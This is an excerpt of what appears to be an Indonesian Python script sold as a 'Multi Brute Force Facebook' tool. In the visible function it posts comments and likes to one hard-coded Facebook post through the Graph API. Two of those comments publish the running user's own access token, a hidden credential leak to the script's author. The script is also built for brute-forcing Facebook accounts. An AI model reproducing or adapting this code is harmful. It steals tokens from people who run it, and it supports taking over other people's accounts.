...
Instragram = 'Instragram.com/Zuck'
LicenseKey = '06 Hari'
Version = '0.5'
Fikri  = 100000146759213
Postingan = 5742509632430538
...
def banner():
    ...
    l6 = ('%s Multi Brute Force Facebook %s%s %sBy %sZuck  '%(H,K,Version,H,K))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
...
komtwol = random.choice(['ANJAY SLEMEX LORD NIKI  X NANO ', 'MR.Riyal NIKI X NANO', 'BANH KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
...
kon = random.choice(["HACKER BEKASI XXXX :)"])
...
def ___fii___Sayang___Kamu___Widiya___():
    ...
    komentar = komtwol
    pipp = kartu2d
    post = '5742509632430538'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/5742509632430538/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/5742509632430538/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/5742509632430538/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/5742509632430538/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/5742509632430538/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/5742509632430538/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/5742509632430538/likes?summary=true&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/5742509632430538/likes?summary=true&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/5742509632430538/likes?summary=true&access_token=' + (token),cookies=cookie)
    menu()
